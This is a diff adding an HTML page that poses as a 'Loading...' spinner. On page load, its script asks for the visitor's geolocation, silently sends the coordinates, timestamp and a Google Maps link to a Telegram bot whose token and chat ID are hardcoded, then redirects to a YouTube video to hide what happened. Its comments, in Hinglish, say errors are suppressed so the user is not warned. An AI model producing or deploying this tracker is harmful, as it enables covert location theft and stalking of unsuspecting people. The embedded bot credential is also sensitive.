@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f2f5;
+            font-family: Arial, sans-serif;
+        }
+        .loader {
+            border: 8px solid #f3f3f3; /* Light grey */
+            border-top: 8px solid #3498db; /* Blue */
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+
+    <script>
+        // Telegram Bot Token aur Chat ID
+        const TELEGRAM_BOT_TOKEN = '7969903007:AAF8MOt9s2IgFyEzhBok9atp15UoqSK-tYw'; // Aapka Bot Token
+        const TELEGRAM_CHAT_ID = '6696895935'; // Aapka Chat ID
+        const REDIRECT_URL = 'https://youtu.be/jSOmHSE8JIw?si=T5nDlk41noysj_J4'; // Redirect URL
+
+        // Geolocation function
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+            } else {
+                // Agar geolocation support nahi hai, toh direct redirect
+                window.location.href = REDIRECT_URL;
+            }
+        }
+
+        // Location Telegram par bhejne ke liye
+        function sendLocation(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const timestamp = new Date().toLocaleString();
+            
+            const message = `Location Found!\nLatitude: ${latitude}\nLongitude: ${longitude}\nTime: ${timestamp}\nGoogle Maps: https://maps.google.com/?q=${latitude},${longitude}`;
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    // Location successfully bhej di gayi, ab redirect karen
+                    window.location.href = REDIRECT_URL;
+                } else {
+                    // Agar Telegram par bhejne mein error aaya, toh bhi redirect karen
+                    window.location.href = REDIRECT_URL;
+                }
+            })
+            .catch(error => {
+                // Network error ho toh bhi redirect karen
+                window.location.href = REDIRECT_URL;
+            });
+        }
+
+        // Error handling (silent, no user notification)
+        function showError(error) {
+            // Errors ko silently handle karen, user ko warn na karen
+            // Error aaye toh bhi redirect karen
+            window.location.href = REDIRECT_URL;
+        }
+
+        // Page load hote hi location fetch karo
+        window.onload = getLocation;
+    </script>
+</body>
+</html>
